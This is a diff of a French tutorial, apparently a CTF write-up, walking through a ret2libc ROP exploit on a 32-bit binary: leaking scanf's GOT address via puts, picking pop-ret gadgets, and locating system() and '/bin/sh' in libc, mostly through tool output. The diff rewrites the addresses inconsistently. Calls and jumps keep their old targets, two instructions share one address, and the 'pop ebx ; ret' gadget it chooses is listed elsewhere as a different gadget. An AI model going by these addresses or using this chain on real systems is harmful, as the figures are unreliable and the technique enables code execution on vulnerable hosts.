@@ -124,29 +124,29 @@ rop:     file format elf32-i386
 
 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE 
-0804bffc R_386_GLOB_DAT    __gmon_start__
-0804c00c R_386_JUMP_SLOT   puts@GLIBC_2.0
-0804c010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
-0804c014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
+0884bffc R_386_GLOB_DAT    __gmon_start__
+0884c00c R_386_JUMP_SLOT   puts@GLIBC_2.0
+0884c010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0884cf14 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
 ```
 
 Nous avons l'addresse de la fonction `scanf` via la ligne
 
 ```
-0804c014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
+0884cf14 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
 ```
 
 Nous pouvons avoir l'addresse de puts :
 ```
 root@10b97ae13330:~# objdump -d rop | grep "<puts@plt>"
-08049030 <puts@plt>:
-0804918e:	e8 9d fe ff ff       	call   8049030 <puts@plt>
+08849f30 <puts@plt>:
+0884a08e:	e8 9d fe ff ff       	call   8049030 <puts@plt>
 ```
 
 Nous avons donc les addresses de :
 
-* `puts@plt`: 0x08049030
-* `__isoc99_scanf@GLIBC_2.7`: 0x0804c014
+* `puts@plt`: 0x08849f30
+* `__isoc99_scanf@GLIBC_2.7`: 0x0884cf14
 
 Puts nous permet d'écrire une string dans stdout et donc d'afficher la valeur une valeur de la libc afin de trouver la différence et donc d'utiliser n'importe quelle autre fonction de la libc dont `system()`.
 La fonction puts prend un argument en paramètre :
@@ -157,28 +157,28 @@ int puts(const char *str)
 Afin de récupérer cet argument nous allons utiliser un ROP Gadget pour sortir notre argument de la stack. Grâce à un gadget de type pop ???; ret. Et pour cela nous allons utiliser ROPgadget:
 ```
 root@10b97ae13330:~# ROPgadget --binary rop | grep pop
-0x08049251 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
-0x0804922d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x0804901b : add esp, 8 ; pop ebx ; ret
-0x080491a8 : inc dword ptr [ebx - 0x746fef3c] ; pop ebp ; cld ; leave ; ret
-0x0804922c : jecxz 0x80491b9 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
-0x0804922b : jne 0x8049219 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x0804901c : les ecx, ptr [eax] ; pop ebx ; ret
-0x0804922e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
-0x0804924f : mov bl, 0x2d ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
-0x0804922f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
-0x080491ae : pop ebp ; cld ; leave ; ret
-0x08049233 : pop ebp ; ret
-0x08049230 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x0804901e : pop ebx ; ret
-0x08049232 : pop edi ; pop ebp ; ret
-0x08049231 : pop esi ; pop edi ; pop ebp ; ret
-0x08049016 : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
+0x09849252 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+0x0984922e : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0984910b : add esp, 8 ; pop ebx ; ret
+0x098491b8 : inc dword ptr [ebx - 0x746fef3c] ; pop ebp ; cld ; leave ; ret
+0x0984923c : jecxz 0x80491b9 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
+0x0984923b : jne 0x8049219 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0984901e : les ecx, ptr [eax] ; pop ebx ; ret
+0x0984924e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
+0x0984925f : mov bl, 0x2d ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+0x0984923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
+0x098491be : pop ebp ; cld ; leave ; ret
+0x09849243 : pop ebp ; ret
+0x09849240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0984902e : pop ebx ; ret
+0x09849242 : pop edi ; pop ebp ; ret
+0x09849241 : pop esi ; pop edi ; pop ebp ; ret
+0x09849026 : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
 ```
 
 Nous avons donc deux choix:
-* 0x08049233 : `pop ebp ; ret`
-* 0x0804901e : `pop ebx ; ret`
+* 0x09849243 : `pop ebp ; ret`
+* 0x09849241 : `pop ebx ; ret`
 
 Enfin nous devons trouver l'addresse du main de l'executable. Avec gdb nous pouvons avoir désassembler le main de notre programme:
 
@@ -186,27 +186,27 @@ Enfin nous devons trouver l'addresse du main de l'executable. Avec gdb nous pouv
 root@5859be6f9e32:~# gdb rop
 gdb-peda$ disassemble main
 Dump of assembler code for function main:
-   0x080491b2 <+0>:	push   ebp
-   0x080491b3 <+1>:	mov    ebp,esp
-   0x080491b5 <+3>:	and    esp,0xfffffff0
-   0x080491b8 <+6>:	call   0x80491ce <__x86.get_pc_thunk.ax>
-   0x080491bd <+11>:	add    eax,0x2e43
-   0x080491c2 <+16>:	call   0x8049172 <input>
-   0x080491c7 <+21>:	mov    eax,0x0
-   0x080491cc <+26>:	leave  
-   0x080491cd <+27>:	ret    
+   0x089491b3 <+0>:	push   ebp
+   0x089491b3 <+1>:	mov    ebp,esp
+   0x089491b5 <+3>:	and    esp,0xfffffff0
+   0x089491b8 <+6>:	call   0x80491ce <__x86.get_pc_thunk.ax>
+   0x089491bd <+11>:	add    eax,0x2e43
+   0x089491c2 <+16>:	call   0x8049172 <input>
+   0x089491c7 <+21>:	mov    eax,0x0
+   0x089491cc <+26>:	leave  
+   0x089491cd <+27>:	ret    
 End of assembler dump.
 ```
 
-Nous avons donc l'addresse du main: `0x080491b2`.
+Nous avons donc l'addresse du main: `0x089491b3`.
 
 Pour récapituler nous avons :
-* `main` 0x080491b2 
-* `puts@plt` 0x08049030
-* `__isoc99_scanf@GLIBC_2.7` 0x0804c014
+* `main` 0x089491b3 
+* `puts@plt` 0x08849f30
+* `__isoc99_scanf@GLIBC_2.7` 0x0884cf14
 * Et des gadgets :
-   * 0x08049233 `pop ebp ; ret`
-   * 0x0804901e `pop ebx ; ret`
+   * 0x09849243 `pop ebp ; ret`
+   * 0x09849241 `pop ebx ; ret`
 
 Notre premier payload va donc être :
 `payload = addrPLTputs + addrPopEbxRet + addrGOTscanf + addrMain`
@@ -221,15 +221,15 @@ Afin de trouver c'est addresses nous pouvons utiliser strings, objdump et/ou rea
 Pour trouver l'addresses de `scanf` dans la libc:
 ```
 root@566553ec2fbd:~# objdump -d /lib32/libc.so.6 | grep isoc99_scanf
-00065480 <__isoc99_scanf@@GLIBC_2.7>:
-   654a8:	75 3c                	jne    654e6 <__isoc99_scanf@@GLIBC_2.7+0x66>
-   654b9:	74 27                	je     654e2 <__isoc99_scanf@@GLIBC_2.7+0x62>
-   654c8:	74 01                	je     654cb <__isoc99_scanf@@GLIBC_2.7+0x4b>
-   654ce:	74 07                	je     654d7 <__isoc99_scanf@@GLIBC_2.7+0x57>
-   6550c:	75 27                	jne    65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
-   65515:	75 1e                	jne    65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
-   65526:	74 01                	je     65529 <__isoc99_scanf@@GLIBC_2.7+0xa9>
-   6552c:	74 07                	je     65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
+00076480 <__isoc99_scanf@@GLIBC_2.7>:
+   764a8:	75 3c                	jne    654e6 <__isoc99_scanf@@GLIBC_2.7+0x66>
+   764b9:	74 27                	je     654e2 <__isoc99_scanf@@GLIBC_2.7+0x62>
+   764c8:	74 01                	je     654cb <__isoc99_scanf@@GLIBC_2.7+0x4b>
+   764ce:	74 07                	je     654d7 <__isoc99_scanf@@GLIBC_2.7+0x57>
+   7650c:	75 27                	jne    65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
+   76515:	75 1e                	jne    65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
+   76526:	74 01                	je     65529 <__isoc99_scanf@@GLIBC_2.7+0xa9>
+   7652c:	74 07                	je     65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
 
 ```
 
@@ -237,20 +237,20 @@ Pour trouver l'addresse de `system` dans la libc:
 ```
 root@566553ec2fbd:~# readelf -s /lib32/libc.so.6 | grep system        
    257: 0012a2c0   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
-   658: 0003e9e0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
-  1525: 0003e9e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+   658: 000feae0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1525: 000feae0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
 ```
 
 Pour trouver l'addresse de la string `/bin/sh` dans la libc:
 ```
 root@566553ec2fbd:~# strings -a -t x /lib32/libc.so.6 | grep /bin/sh
- 17eaaa /bin/sh
+ 18ebbb /bin/sh
 ```
 
 Nous avons donc:
-* `__isoc99_scanf@GLIBC_2.7`: 0x00065480
-* `system@@GLIBC_2.0`:  0x0003e9e0 
-* `/bin/sh`: 0x0017eaaa 
+* `__isoc99_scanf@GLIBC_2.7`: 0x00076480
+* `system@@GLIBC_2.0`:  0x000feae0 
+* `/bin/sh`: 0x0018ebbb 
 
 Pour trouver la base de la libc on fait la différence entre la fuite du scanf qu'on a eu dans la première partie et l'addresse de scanf trouver dans la libc.
 On peut maintenant ajouter a cette différence l'addresse de la fonction system ou l'addresse de la string “/bin/sh” afin d'y accèder avec notre payload.
